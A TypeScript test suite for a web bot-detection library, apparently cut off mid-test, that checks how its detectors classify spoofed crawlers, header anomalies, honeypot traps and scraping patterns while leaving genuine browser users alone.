import { describe, expect, it } from "vitest";
import { BotHandler, createFacts } from "../src/index.js";
import { BOT_CATEGORIES, BOT_SIGNATURES } from "../src/detectors/known-bots.js";
import { acceptSignatureDetector } from "../src/detectors/accept-signature.js";
import { cadenceDetector } from "../src/detectors/cadence.js";
import { crawlBreadthDetector } from "../src/detectors/crawl-breadth.js";
import { parameterSweepDetector } from "../src/detectors/parameter-sweep.js";
import { transportCoherenceDetector } from "../src/detectors/transport-coherence.js";
import { defaultDetectors } from "../src/detectors/index.js";
import { DEFAULT_TRAP_PATHS, renderTrapField, renderTrapLink, trapRobotsEntries } from "../src/detectors/trap.js";
import { __payloadInternals } from "../src/detectors/probe-signature.js";
import type { RequestFacts } from "../src/types.js";
import type { BotHandlerConfig } from "../src/config.js";
import { clientHintsDetector } from "../src/detectors/client-hints.js";
import { crawlerVerificationDetector } from "../src/detectors/crawler-verification.js";
import { fetchMetadataDetector } from "../src/detectors/fetch-metadata.js";
import { headerIntegrityDetector } from "../src/detectors/header-integrity.js";
import { headerOrderDetector } from "../src/detectors/header-order.js";
import { ipIntelligenceDetector } from "../src/detectors/ip-intelligence.js";
import { identityRotationDetector } from "../src/detectors/identity-rotation.js";
import { rateAnomalyDetector } from "../src/detectors/rate-anomaly.js";
import { selfIdentifiedDetector } from "../src/detectors/self-identified.js";
import { TRAP_FIELD_SOURCE, trapDetector } from "../src/detectors/trap.js";
import { MAX_TRACKED_ARRIVALS, MAX_TRACKED_PATHS, MAX_TRACKED_USER_AGENTS } from "../src/state.js";
import { ActorState } from "../src/state.js";
import { CHROME_HEADERS, collect, fakeResolver, failingResolver, makeContext, makeFacts } from "./helpers.js";

const GOOGLEBOT_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";

describe("a real browser request", () => {
  // The single most important test in the suite. Everything else measures how well
  // we catch bots; this measures whether we leave people alone.
  it("produces no bot evidence from any default detector", async () => {
    const context = makeContext();
    const detectors = [
      selfIdentifiedDetector(),
      headerIntegrityDetector(),
      clientHintsDetector(),
      fetchMetadataDetector(),
      acceptSignatureDetector(),
      headerOrderDetector(),
      rateAnomalyDetector(),
      cadenceDetector(),
      trapDetector(),
      ipIntelligenceDetector(),
    ];
    for (const detector of detectors) {
      const evidence = await collect(detector, context);
      const bot = evidence.filter((item) => item.direction === "bot");
      expect(bot, `${detector.id} fired on a genuine Chrome request: ${JSON.stringify(bot)}`).toHaveLength(0);
    }
  });
});

describe("selfIdentifiedDetector", () => {
  it("treats a library user agent as proven", async () => {
    const [evidence] = await collect(selfIdentifiedDetector(), makeContext({ headers: { "user-agent": "curl/8.4.0" } }));
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.botClass).toBe("http-client");
    expect(evidence?.deterministicBasis).toBeTruthy();
  });

  it("recognises a declared crawler", async () => {
    const evidence = await collect(selfIdentifiedDetector(), makeContext({ headers: { "user-agent": GOOGLEBOT_UA } }));
    expect(evidence[0]?.identity).toBe("googlebot");
    expect(evidence[0]?.certainty).toBe("certain");
  });

  it("accepts an unknown crawler that publishes a contact address", async () => {
    const [evidence] = await collect(
      selfIdentifiedDetector(),
      makeContext({ headers: { "user-agent": "Mozilla/5.0 (compatible; BrandNewBot/1.0; +https://example.com/bot)" } }),
    );
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.botClass).toBe("declared-bot");
  });

  it("holds back from certainty when a crawler-like word has no contact address", async () => {
    const [evidence] = await collect(selfIdentifiedDetector(), makeContext({ headers: { "user-agent": "Mozilla/5.0 (compatible; Some Spider 1.0)" } }));
    expect(evidence?.certainty).toBe("strong");
    expect(evidence?.botClass).toBe("declared-bot");
  });

  it("flags an unrecognised bare client token, without claiming to know what it is", async () => {
    const [evidence] = await collect(selfIdentifiedDetector(), makeContext({ headers: { "user-agent": "AcmeInternalSync/2.3" } }));
    expect(evidence?.certainty).toBe("strong");
    expect(evidence?.botClass).toBe("http-client");
  });

  it("treats a missing User-Agent as merely suggestive", async () => {
    const [evidence] = await collect(selfIdentifiedDetector(), makeContext({ headers: { host: "example.test" } }));
    expect(evidence?.certainty).toBe("moderate");
  });
});

describe("crawlerVerificationDetector", () => {
  const googlebotContext = (resolver: ReturnType<typeof failingResolver>) =>
    makeContext({ headers: { "user-agent": GOOGLEBOT_UA }, ip: "66.249.66.1", resolver });

  it("confirms a crawler when forward-confirmed reverse DNS agrees", async () => {
    const resolver = fakeResolver({ "66.249.66.1": ["crawl-66-249-66-1.googlebot.com"] }, { "crawl-66-249-66-1.googlebot.com": ["66.249.66.1"] });
    const [evidence] = await collect(crawlerVerificationDetector(), googlebotContext(resolver));
    expect(evidence?.botClass).toBe("verified-bot");
    expect(evidence?.certainty).toBe("certain");
  });

  it("calls out a forgery when the PTR record points elsewhere", async () => {
    const resolver = fakeResolver({ "66.249.66.1": ["vps-1234.cheap-hosting.example"] }, {});
    const [evidence] = await collect(crawlerVerificationDetector(), googlebotContext(resolver));
    expect(evidence?.botClass).toBe("impersonator");
    expect(evidence?.certainty).toBe("certain");
  });

  it("calls out a forgery when the PTR name does not resolve back to the client", async () => {
    const resolver = fakeResolver({ "66.249.66.1": ["crawl.googlebot.com"] }, { "crawl.googlebot.com": ["8.8.8.8"] });
    const [evidence] = await collect(crawlerVerificationDetector(), googlebotContext(resolver));
    expect(evidence?.botClass).toBe("impersonator");
  });

  it("is not fooled by a PTR name that merely contains the domain", async () => {
    const resolver = fakeResolver({ "66.249.66.1": ["googlebot.com.evil.example"] }, { "googlebot.com.evil.example": ["66.249.66.1"] });
    const [evidence] = await collect(crawlerVerificationDetector(), googlebotContext(resolver));
    expect(evidence?.botClass).toBe("impersonator");
  });

  // Silence on failure is the property that keeps a resolver outage from turning
  // into an accusation against every crawler on the internet.
  it("says nothing at all when DNS gives no answer", async () => {
    const evidence = await collect(crawlerVerificationDetector(), googlebotContext(failingResolver()));
    expect(evidence).toHaveLength(0);
  });

  it("confirms an ip-ranges crawler only when ranges are configured", async () => {
    const withoutRanges = makeContext({ headers: { "user-agent": "Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)" }, ip: "198.51.100.5" });
    expect(await collect(crawlerVerificationDetector(), withoutRanges)).toHaveLength(0);

    const inside = makeContext({
      headers: { "user-agent": "Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)" },
      ip: "198.51.100.5",
      ranges: { "crawler:gptbot": ["198.51.100.0/24"] },
    });
    expect((await collect(crawlerVerificationDetector(), inside))[0]?.botClass).toBe("verified-bot");

    const outside = makeContext({
      headers: { "user-agent": "Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)" },
      ip: "203.0.113.5",
      ranges: { "crawler:gptbot": ["198.51.100.0/24"] },
    });
    expect((await collect(crawlerVerificationDetector(), outside))[0]?.botClass).toBe("impersonator");
  });
});

describe("headerIntegrityDetector", () => {
  it("treats a connection header on HTTP/2 as a protocol violation", async () => {
    const [evidence] = await collect(
      headerIntegrityDetector(),
      makeContext({ headers: { ...CHROME_HEADERS, connection: "keep-alive" }, httpVersion: "2.0" }),
    );
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.summary).toMatch(/connection-specific/);
  });

  it("flags a browser claim with no Accept header, but only as strong", async () => {
    const headers = { ...CHROME_HEADERS };
    delete headers["accept"];
    const [evidence] = await collect(headerIntegrityDetector(), makeContext({ headers }));
    expect(evidence?.certainty).toBe("strong");
  });

  it("keeps a missing Accept-Language at moderate, because privacy tooling strips it", async () => {
    const headers = { ...CHROME_HEADERS };
    delete headers["accept-language"];
    const [evidence] = await collect(headerIntegrityDetector(), makeContext({ headers }));
    expect(evidence?.certainty).toBe("moderate");
  });
});

describe("clientHintsDetector", () => {
  it("catches a platform hint that contradicts the User-Agent", async () => {
    const [evidence] = await collect(
      clientHintsDetector(),
      makeContext({ headers: { ...CHROME_HEADERS, "sec-ch-ua-platform": '"Windows"' } }),
    );
    expect(evidence?.summary).toMatch(/Platform/);
    expect(evidence?.certainty).toBe("strong");
  });

  it("does not treat the GREASE brand as a version disagreement", async () => {
    const evidence = await collect(clientHintsDetector(), makeContext());
    expect(evidence).toHaveLength(0);
  });

  it("treats a self-declared headless brand as proven", async () => {
    const [evidence] = await collect(
      clientHintsDetector(),
      makeContext({ headers: { ...CHROME_HEADERS, "sec-ch-ua": '"HeadlessChrome";v="122", "Chromium";v="122"' } }),
    );
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.botClass).toBe("automation");
  });

  it("notices Chromium over HTTPS sending no hints at all", async () => {
    const headers = { ...CHROME_HEADERS };
    delete headers["sec-ch-ua"];
    delete headers["sec-ch-ua-mobile"];
    delete headers["sec-ch-ua-platform"];
    const [evidence] = await collect(clientHintsDetector(), makeContext({ headers }));
    expect(evidence?.certainty).toBe("strong");
  });
});

describe("fetchMetadataDetector", () => {
  it("rejects an incoherent dest/mode pairing", async () => {
    const [evidence] = await collect(
      fetchMetadataDetector(),
      makeContext({ headers: { ...CHROME_HEADERS, "sec-fetch-mode": "no-cors" } }),
    );
    expect(evidence?.summary).toMatch(/Incoherent/);
  });

  it("stays quiet for a client that plausibly predates the headers", async () => {
    const headers: Record<string, string> = { ...CHROME_HEADERS, "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1" };
    delete headers["sec-fetch-site"];
    delete headers["sec-fetch-mode"];
    delete headers["sec-fetch-user"];
    delete headers["sec-fetch-dest"];
    delete headers["sec-ch-ua"];
    delete headers["sec-ch-ua-mobile"];
    delete headers["sec-ch-ua-platform"];
    expect(await collect(fetchMetadataDetector(), makeContext({ headers }))).toHaveLength(0);
  });
});

describe("acceptSignatureDetector", () => {
  it("flags a navigation that accepts anything", async () => {
    const [evidence] = await collect(acceptSignatureDetector(), makeContext({ headers: { ...CHROME_HEADERS, accept: "*/*" } }));
    expect(evidence?.certainty).toBe("strong");
  });

  it("flags an Accept-Language that is not valid grammar", async () => {
    const [evidence] = await collect(acceptSignatureDetector(), makeContext({ headers: { ...CHROME_HEADERS, "accept-language": "en_US;;q=zzz" } }));
    expect(evidence?.summary).toMatch(/language-range/);
  });
});

describe("headerOrderDetector", () => {
  it("catches the python-requests ordering", async () => {
    const headers = { ...CHROME_HEADERS };
    const order = ["host", "user-agent", "accept-encoding", "accept", "connection"];
    const [evidence] = await collect(headerOrderDetector(), makeContext({ headers, headerOrder: order }));
    expect(evidence?.summary).toMatch(/accept-encoding before accept/);
  });

  it("says nothing on HTTP/2, where order carries no meaning", async () => {
    const order = ["accept-encoding", "accept", "host", "user-agent"];
    expect(await collect(headerOrderDetector(), makeContext({ headerOrder: order, httpVersion: "2.0" }))).toHaveLength(0);
  });

  it("says nothing when the transport exposed no order", async () => {
    expect(await collect(headerOrderDetector(), makeContext({ headerOrder: [] }))).toHaveLength(0);
  });
});

describe("trapDetector", () => {
  it("is certain about a trap path", async () => {
    const [evidence] = await collect(trapDetector({ paths: ["/internal/export.csv"] }), makeContext({ path: "/internal/export.csv" }));
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.deterministicBasis).toBeTruthy();
  });

  it("is certain about a filled hidden field, and silent about an empty one", async () => {
    const filled = await collect(trapDetector({ formFields: ["website"] }), makeContext({ path: "/contact?website=http://spam.example" }));
    expect(filled[0]?.certainty).toBe("certain");
    expect(await collect(trapDetector({ formFields: ["website"] }), makeContext({ path: "/contact?website=" }))).toHaveLength(0);
  });

  // The forms a honeypot is worth putting on — sign-up, contact, comment, login — are
  // POSTs, so the field arrives in a body this library never reads. Checking only the
  // query string meant `renderTrapField` produced a field that was rendered, filled,
  // and ignored.
  it("sees a hidden field submitted in a POST body", async () => {
    const detector = trapDetector({ formFields: ["company_url"] });
    const filled = await collect(
      detector,
      makeContext({ method: "POST", path: "/contact", extra: { [TRAP_FIELD_SOURCE]: { email: "a@b.com", company_url: "http://spam.example" } } }),
    );
    expect(filled[0]?.certainty).toBe("certain");
    expect(filled[0]?.metadata?.["source"]).toBe("body");
  });

  it("stays silent when the hidden field arrives empty, as a person's submission does", async () => {
    const detector = trapDetector({ formFields: ["company_url"] });
    const context = makeContext({ method: "POST", path: "/contact", extra: { [TRAP_FIELD_SOURCE]: { email: "a@b.com", company_url: "" } } });
    expect(await collect(detector, context)).toHaveLength(0);
  });

  // This feeds a `certain` verdict, so anything that is not plainly a filled-in
  // string must not be read as one.
  it("ignores a body it cannot read as fields", async () => {
    const detector = trapDetector({ formFields: ["company_url"] });
    for (const extra of [{ [TRAP_FIELD_SOURCE]: "company_url=x" }, { [TRAP_FIELD_SOURCE]: null }, { [TRAP_FIELD_SOURCE]: { company_url: { nested: true } } }, {}]) {
      expect(await collect(detector, makeContext({ method: "POST", path: "/contact", extra })), JSON.stringify(extra)).toHaveLength(0);
    }
  });
});

describe("ipIntelligenceDetector", () => {
  it("treats an operator denylist as a decision rather than an inference", async () => {
    const [evidence] = await collect(ipIntelligenceDetector(), makeContext({ ip: "198.51.100.9", ranges: { denylist: ["198.51.100.0/24"] } }));
    expect(evidence?.certainty).toBe("certain");
    expect(evidence?.deterministicBasis).toMatch(/local policy/);
  });

  it("keeps datacenter ranges at moderate", async () => {
    const [evidence] = await collect(ipIntelligenceDetector(), makeContext({ ip: "198.51.100.9", ranges: { datacenter: ["198.51.100.0/24"] } }));
    expect(evidence?.certainty).toBe("moderate");
  });
});

describe("behavioural detectors", () => {
  it("reports a high rate without ever calling it proof", async () => {
    const state = new ActorState("actor", 0);
    for (let i = 0; i < 60; i++) state.record(makeFacts({ timestamp: 1000 + i * 10, path: `/p${i}` }));
    const [evidence] = await collect(rateAnomalyDetector(), makeContext({ state, timestamp: 1600 }));
    expect(evidence?.certainty).toBe("moderate");
    // Even at its most extreme this signal is capped well below `strong`, so it can
    // never on its own reach a terminal action.
    expect(evidence?.weight).toBeLessThanOrEqual(0.4);
    expect(evidence?.metadata?.["undercounted"]).toBe(true);
  });

  it("notices machine-regular pacing", async () => {
    const state = new ActorState("actor", 0);
    for (let i = 0; i < 12; i++) state.record(makeFacts({ timestamp: 1000 + i * 2000, path: `/p${i}` }));
    const [evidence] = await collect(cadenceDetector(), makeContext({ state, timestamp: 1000 + 12 * 2000 }));
    expect(evidence?.summary).toMatch(/machine-regular/);
  });

  it("leaves ragged human pacing alone", async () => {
    const gaps = [1200, 8400, 400, 15000, 2300, 60000, 900, 4300, 30000, 1100];
    const state = new ActorState("actor", 0);
    let now = 1000;
    for (const [index, gap] of gaps.entries()) {
      now += gap;
      state.record(makeFacts({ timestamp: now, path: `/p${index}` }));
    }
    expect(await collect(cadenceDetector(), makeContext({ state, timestamp: now }))).toHaveLength(0);
  });
});

describe("thresholds that could never be reached", () => {
  // Both counts saturate per actor, so a threshold above the cap leaves a detector
  // running on every request and firing on none — the "configured but inert" failure
  // this library refuses to ship anywhere else.
  it("refuses a rotation threshold above what an actor remembers", () => {
    expect(() => identityRotationDetector({ threshold: MAX_TRACKED_USER_AGENTS + 1 })).toThrow(RangeError);
    expect(() => identityRotationDetector({ threshold: MAX_TRACKED_USER_AGENTS })).not.toThrow();
  });

  it("refuses a rate threshold above the arrival ring", () => {
    expect(() => rateAnomalyDetector({ threshold: MAX_TRACKED_ARRIVALS + 1 })).toThrow(RangeError);
    expect(() => rateAnomalyDetector({ hardThreshold: MAX_TRACKED_ARRIVALS + 1 })).toThrow(RangeError);
    expect(() => rateAnomalyDetector({ threshold: 20, hardThreshold: MAX_TRACKED_ARRIVALS })).not.toThrow();
  });

  // The count an actor reports is capped, which is exactly why the guard is needed:
  // thirty spoofed User-Agents still read as four.
  it("saturates the rotation count, as the guard assumes", () => {
    const state = new ActorState("actor", 0);
    for (let i = 0; i < 30; i++) {
      state.record(makeFacts({ headers: { "user-agent": `Rotator/${i}` }, headerOrder: ["user-agent"], timestamp: i * 100 }));
    }
    expect(state.total).toBe(30);
    expect(state.distinctUserAgents).toBe(MAX_TRACKED_USER_AGENTS);
  });

  // A coefficient of variation from one gap is identically zero whatever the data,
  // so a single-sample cadence check would call every actor machine-regular.
  it("will not compute a cadence from a single gap", async () => {
    const state = new ActorState("actor", 0);
    for (const at of [0, 1000]) state.record(makeFacts({ timestamp: at }));
    const evidence = await collect(cadenceDetector({ minSamples: 1 }), makeContext({ state }));
    expect(evidence).toEqual([]);
  });
});

describe("crawlBreadthDetector at scale", () => {
  function crawl(pages: number, revisitsEach = 0): ActorState {
    const state = new ActorState("actor", 0);
    let at = 0;
    for (let page = 0; page < pages; page++) {
      state.record(makeFacts({ path: `/article/${page}`, timestamp: at++ * 500 }));
      for (let r = 0; r < revisitsEach; r++) state.record(makeFacts({ path: "/index", timestamp: at++ * 500 }));
    }
    return state;
  }

  // The distinct-path count saturates and the request total does not, so dividing one
  // by the other made the ratio fall as an actor kept crawling: the detector went
  // quiet in proportion to how hard something was enumerating the site.
  it("still fires on a crawl far larger than the count it can hold", async () => {
    for (const pages of [40, 100, 300]) {
      const evidence = await collect(crawlBreadthDetector(), makeContext({ state: crawl(pages) }));
      expect(evidence, `${pages} distinct pages, never revisited`).toHaveLength(1);
      expect(evidence[0]?.metadata?.["saturated"]).toBe(pages > 64);
    }
  });

  // The direction that costs a person their page: heavy revisiting is what reading
  // looks like, and it must stay silent however many pages it eventually covers.
  it("stays silent for someone who revisits, however far they get", async () => {
    for (const revisits of [1, 2, 3]) {
      const state = crawl(90, revisits);
      expect(state.distinctPaths, "the reader reached the cap").toBe(MAX_TRACKED_PATHS);
      expect(await collect(crawlBreadthDetector(), makeContext({ state })), `revisiting ${revisits}x`).toEqual([]);
    }
  });

  it("refuses a threshold above the count it can hold", () => {
    expect(() => crawlBreadthDetector({ threshold: MAX_TRACKED_PATHS + 1 })).toThrow(RangeError);
    expect(() => crawlBreadthDetector({ threshold: MAX_TRACKED_PATHS })).not.toThrow();
  });
});

describe("fetchMetadataDetector and Sec-Fetch-User", () => {
  const NAV = { ...CHROME_HEADERS, "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-dest": "document", "sec-fetch-user": "?1" };

  it("says nothing about a real navigation", async () => {
    expect(await collect(fetchMetadataDetector(), makeContext({ headers: NAV, headerOrder: Object.keys(NAV) }))).toEqual([]);
  });

  // The `?1` a browser sent is exactly right; the accusation came entirely from a
  // header that was not in front of us. The destination check beside it already
  // guarded for this.
  it("does not accuse a navigation whose mode header was never recorded", async () => {
    const { "sec-fetch-mode": _mode, ...withoutMode } = NAV;
    const headers = withoutMode as Record<string, string>;
    expect(await collect(fetchMetadataDetector(), makeContext({ headers, headerOrder: Object.keys(headers) }))).toEqual([]);
  });

  it("still reports a Sec-Fetch-User that contradicts the mode it arrived with", async () => {
    const headers = { ...CHROME_HEADERS, "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "sec-fetch-user": "?1" };
    const evidence = await collect(fetchMetadataDetector(), makeContext({ headers, headerOrder: Object.keys(headers) }));
    expect(evidence.map((item) => item.summary).join(" ")).toContain("Sec-Fetch-User");
  });

  it("still reports a value browsers never send", async () => {
    const headers = { ...NAV, "sec-fetch-user": "?0" };
    const evidence = await collect(fetchMetadataDetector(), makeContext({ headers, headerOrder: Object.keys(headers) }));
    expect(evidence.map((item) => item.summary).join(" ")).toContain("Sec-Fetch-User");
  });
});

describe("what counts as a client declaring itself", () => {
  const declare = async (userAgent: string) => {
    const headers = { ...CHROME_HEADERS, "user-agent": userAgent };
    return collect(selfIdentifiedDetector(), makeContext({ headers, headerOrder: Object.keys(headers) }));
  };

  // The rule is both halves: automation announced, and an operator named. Deciding it
  // on the contact alone made a proven bot of anyone whose app puts its own address in
  // the string.
  it("is certain about a crawler that says so and names its operator", async () => {
    const evidence = await declare("Mozilla/5.0 (compatible; ExampleCrawler/1.0; +https://example.test/bot)");
    expect(evidence[0]?.certainty).toBe("certain");
  });

  // The `+URL` convention announces automation on its own, which is how a crawler that
  // never uses the word "bot" still declares itself.
  it("is certain about a crawler that uses only the +URL convention", async () => {
    const evidence = await declare("Mozilla/5.0 (compatible; Mozilla/5.0; +https://search.marginalia.nu/)");
    expect(evidence[0]?.certainty).toBe("certain");
  });

  // But only in a string that is not also a browser. A podcast app sends one
  // User-Agent for fetching feeds and for opening the links a listener taps, and it
  // carries the convention either way — so the convention alone reached certainty
  // about a person. A rendering engine in the string is what tells them apart.
  it("is not certain about an app that carries the convention and a rendering engine", async () => {
    const evidence = await declare(
      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ExampleCast/2025.4 (+http://examplecast.test/; iOS podcast app)",
    );
    expect(evidence.length, "an unrecognised app is still worth noting, just not proving").toBeGreaterThan(0);
    for (const item of evidence) expect(item.certainty, item.summary).not.toBe("certain");
  });

  it("is not certain about a bare URL or address with no announcement at all", async () => {
    for (const ua of [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Notes/3.1 (support@notes.example)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.7 Safari/605.1.15 Ledger/2.4 (https://ledger.example)",
    ]) {
      for (const item of await declare(ua)) expect(item.certainty, ua.slice(0, 40)).not.toBe("certain");
    }
  });
});

/**
 * Verifying an identity with a check of your own.
 *
 * Most of the signature database publishes no proof this library can check: no DNS
 * mechanism, no range list, so the claim is unfalsifiable and the honest answer is
 * silence. That is 133 of the 179 signatures. But an operator often *can* check — their
 * CDN has already verified the crawler and says so in a header it adds, the bot signs its
 * requests, they hold the ASN data — and until this hook existed, saying so meant writing
 * a detector that reimplemented the confirm and refute semantics, including the part where
 * an inconclusive answer must stay quiet.
 */
describe("verifying a crawler with your own check", () => {
  const claim = (ua: string): ReturnType<typeof createFacts> =>
    createFacts({ method: "GET", url: "/x", headers: { host: "shop.test", "user-agent": ua, accept: "*/*" }, ip: "203.0.113.7" });
  // idealo publishes no DNS mechanism and no range list, so the built-in checks have
  // nothing to say about it either way — which is the case this hook exists for, and is
  // true of 133 of the 179 signatures. AhrefsBot would have been the wrong example: it
  // has forward-confirmed reverse DNS, so an inconclusive verifier there falls through to
  // a check that does reach an answer.
  const IDEALO = "Mozilla/5.0 (compatible; idealo-bot/1.0; +https://www.idealo.de/robots)";
  const GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";

  it("turns your confirmation into a verified identity", async () => {
    const handler = new BotHandler({ crawlerVerification: { verifiers: { googlebot: () => "verified" } } });
    const assessment = await handler.assess(claim(GOOGLEBOT));
    expect(assessment.verdict).toBe("verified-bot");
    expect(assessment.certain).toBe(true);
    const evidence = assessment.evidence.find((item) => item.detector === "crawler-verification");
    // `certain` obliges a written basis, and this one has to say whose assertion it is.
    expect(evidence?.deterministicBasis).toContain("Your application confirmed");
  });

  it("turns your refutation into an impersonator, for a bot nothing else could check", async () => {
    const handler = new BotHandler({ crawlerVerification: { verifiers: { idealo: () => "refuted" } } });
    const assessment = await handler.assess(claim(IDEALO));
    const evidence = assessment.evidence.find((item) => item.detector === "crawler-verification");
    expect(evidence?.botClass).toBe("impersonator");
    expect(evidence?.certainty).toBe("certain");
  });

  it("says nothing at all when your check does not know", async () => {
    // The important half. A verifier that could not reach its key server must not be
    // read as an accusation, or an outage becomes a wave of blocked crawlers.
    const handler = new BotHandler({ crawlerVerification: { verifiers: { idealo: () => "unknown" } } });
    const assessment = await handler.assess(claim(IDEALO));
    expect(assessment.evidence.some((item) => item.detector === "crawler-verification")).toBe(false);
  });

  it("treats a throw as not knowing, rather than as a refusal", async () => {
    const handler = new BotHandler({
      crawlerVerification: {
        verifiers: {
          idealo: () => {
            throw new Error("key server unreachable");
          },
        },
      },
    });
    const assessment = await handler.assess(claim(IDEALO));
    expect(assessment.evidence.some((item) => item.detector === "crawler-verification")).toBe(false);
  });

  it("accepts an async verifier, which is the shape a real one has", async () => {
    const handler = new BotHandler({
      crawlerVerification: {
        verifiers: {
          idealo: async () => {
            await Promise.resolve();
            return "verified" as const;
          },
        },
      },
    });
    const assessment = await handler.assess(claim(IDEALO));
    expect(assessment.evidence.some((item) => item.botClass === "verified-bot")).toBe(true);
  });

  it("hands the verifier the signature it is being asked about", async () => {
    const seen: string[] = [];
    const handler = new BotHandler({
      crawlerVerification: {
        verifiers: {
          idealo: (_ctx, signature) => {
            seen.push(`${signature.id}/${signature.category}`);
            return "unknown";
          },
        },
      },
    });
    await handler.assess(claim(IDEALO));
    expect(seen).toEqual(["idealo/commerce"]);
  });

  it("leaves every other identity to the built-in checks", async () => {
    // A verifier for one bot must not silence the DNS path for another.
    const handler = new BotHandler({ crawlerVerification: { verifiers: { idealo: () => "verified" } } });
    const assessment = await handler.assess(claim(GOOGLEBOT));
    expect(assessment.verdict).not.toBe("verified-bot");
  });
});

/**
 * The categories a rule can name.
 *
 * Three of them are new, and each exists because the decision differs from its nearest
 * neighbour: a price comparator is not an SEO auditor, a citation index is not a model
 * being trained, and an accessibility crawler is not an uptime probe.
 */
describe("the widened bot taxonomy", () => {
  const identify = async (ua: string): Promise<{ identity: string | undefined; category: string | undefined }> => {
    const handler = new BotHandler();
    const assessment = await handler.assess(
      createFacts({ method: "GET", url: "/x", headers: { host: "shop.test", "user-agent": ua, accept: "*/*" }, ip: "203.0.113.7" }),
    );
    return { identity: assessment.identity, category: BOT_SIGNATURES.find((signature) => signature.id === assessment.identity)?.category };
  };

  it("names a price comparison crawler as commerce", async () => {
    expect(await identify("Mozilla/5.0 (compatible; idealo-bot/1.0; +https://www.idealo.de/robots)")).toEqual({ identity: "idealo", category: "commerce" });
  });

  it("names a citation index as academic rather than as an AI crawler", async () => {
    expect(await identify("Mozilla/5.0 (compatible; CrossrefBot/1.0; mailto:labs@crossref.org)")).toEqual({ identity: "crossref", category: "academic" });
  });

  it("names an accessibility auditor as its own thing", async () => {
    expect(await identify("Mozilla/5.0 (compatible; SiteimproveBot/2.0; +https://siteimprove.com/bot)")).toEqual({ identity: "siteimprove", category: "accessibility" });
  });

  it("leaves a comparison crawler for the operator to decide about", async () => {
    // Not benign: the same crawler is a distribution channel to one retailer and a
    // competitor's research tool to the next, and that is not this library's call.
    expect(BOT_SIGNATURES.find((signature) => signature.id === "idealo")?.benign).toBe(false);
    // Where it plainly is wanted, it says so.
    expect(BOT_SIGNATURES.find((signature) => signature.id === "siteimprove")?.benign).toBe(true);
  });

  it("names the crawlers that reach a page on a person's behalf", async () => {
    // A mail gateway checking a link somebody was sent. Blocking one does not inconvenience
    // a crawler — it tells a real person their mail contained a link that could not be
    // verified, which is why the whole category is benign.
    expect(await identify("Mozilla/5.0 (compatible; ProofpointURLDefenseBot/1.0; +https://www.proofpoint.com/us)")).toEqual({ identity: "proofpoint", category: "email-security" });
    expect(BOT_SIGNATURES.filter((signature) => signature.category === "email-security").every((signature) => signature.benign)).toBe(true);
  });

  it("names ad verification apart from ad intelligence", async () => {
    // Reading a page to decide whether an ad may run beside it; a publisher wants these.
    expect(await identify("Mozilla/5.0 (compatible; DoubleVerifyBot/1.0; +https://doubleverify.com/bot)")).toEqual({ identity: "doubleverify", category: "advertising" });
    // Collecting what everyone else is running. Named, and not called benign.
    expect(BOT_SIGNATURES.find((signature) => signature.id === "adbeat")?.benign).toBe(false);
  });

  it("does not name a bot it cannot tell from a person", async () => {
    // Spotify's podcast fetcher sends `Spotify/1.0`, and so does the Spotify desktop app
    // with somebody driving it. Adding that token blocked a human under three presets at
    // once, which the corpus caught; the fetcher stays unnamed rather than named wrongly.
    expect(BOT_SIGNATURES.some((signature) => signature.tokens.includes("spotify/"))).toBe(false);
  });

  it("keeps every category enumerable, so a rule editor can list them", () => {
    const used = new Set(BOT_SIGNATURES.map((signature) => signature.category));
    for (const category of used) expect(BOT_CATEGORIES).toContain(category);
    for (const fresh of ["commerce", "academic", "accessibility"]) expect(BOT_CATEGORIES).toContain(fresh);
  });
});

/**
 * The collection breadth cannot see.
 *
 * `crawl-breadth` counts distinct paths, and a path carries no query string — so
 * enumerating a catalogue reads to it as somebody rereading one page. The gap was
 * measured before this detector existed: the same two hundred requests scored 62 and were
 * called `suspected-bot` when expressed as distinct paths, and 55 — under the line — when
 * expressed as `?page=N`.
 */
describe("catching a sweep that leaves the path alone", () => {
  const BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  const headers = {
    host: "shop.example",
    "user-agent": BROWSER,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-GB,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
  };

  const walk = async (count: number, url: (i: number) => string): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
    const handler = new BotHandler({ preset: "protect-content" });
    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
    for (let i = 0; i < count; i++) {
      const result = await handler.handle(createFacts({ method: "GET", url: url(i), headers, ip: "203.0.113.77", timestamp: 1_700_000_000_000 + i * 400 }));
      last = result.assessment;
    }
    return last as Awaited<ReturnType<BotHandler["assess"]>>;
  };
  const swept = (assessment: { evidence: Array<{ detector: string }> }): boolean =>
    assessment.evidence.some((item) => item.detector === "parameter-sweep");

  it("scores a paginated sweep like the path-walking it really is", async () => {
    const sweep = await walk(200, (i) => `/products?page=${i}`);
    expect(swept(sweep)).toBe(true);
